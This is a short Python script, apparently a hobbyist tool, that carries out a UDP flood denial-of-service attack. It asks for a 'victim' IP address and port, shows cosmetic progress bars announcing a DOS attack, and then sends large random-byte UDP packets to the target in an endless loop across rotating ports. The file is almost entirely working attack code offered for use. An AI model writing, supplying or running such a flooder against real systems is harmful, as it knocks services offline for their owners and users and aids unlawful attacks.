#!/usr/bin/python3
#coding=utf-8
import socket
import os
import random
import time
from datetime import datetime
from time import sleep

#### colours ####
# B='\033[1;94m'
# R='\033[1;91m'
# G='\033[1;92m'
# W='\033[1;97m'
# S='\033[1;96m'
# P='\033[1;95m'
# Y='\033[1;93m'
B='\033[1;94m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'

gbolahan = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(9897)


os.system("clear")









  
ip = input("\033[1;93mEnter Victim or Target IP Address : ")
port = int(input("\033[1;94mEnter Victim or Target Port, default port is 80, 4444       : "))
os.system("clear")

print ("\033[1;94mLoading attack script█████████████████████████████████████████████████by % ")
time.sleep(4)
print ("\033[1;92m[                    ] 0% ")
time.sleep(3.5)
print ("\033[1;96m[███████████                 ] 25%")
time.sleep(3)      
print ("\033[1;97m[████████████████████████         ] 50%")
time.sleep(3)
print ("\033[1;95m[█████████████████████████████████████     ] 75%")
time.sleep(2)
print ("\033[1;91m[█████████████████████████████████████████████████████] 100%")
time.sleep(2)
print ("\033[1;93mLoading attack script sucessful█████████████████████████████████████████████████████100%")
time.sleep(2)
print ("\033[1;96mLaunching DOS attack[                    ] 0% ")
time.sleep(3)
print ("\033[1;92mLaunching DOS attack██████████████████████████████████████████████████████████████████████████████████████████████████100%")
time.sleep(2)
print ("Starting DOS attack on victim ip address[                    ] 0%")
time.sleep(2)
print ("\033[1;91mStarting DOS attack on victim ip address██████████████████████████████████████████████████████████████████████████████████████████████████100%")
time.sleep(2)
sent = 0
while True:
     gbolahan.sendto(bytes, (ip,port))  #sending a lot of UDP flooding to the entered ip address and port
     sent = sent + 2
     port = port + 2
     print ("\033[1;91mSending \033[1;92m%s \033[1;91m Packets to \033[1;92m%s \033[1;91mThrough port \033[1;92m%s "%(sent, ip, port)) #Sending a lot of request to your target
     if port == 65534:
       port = 2
















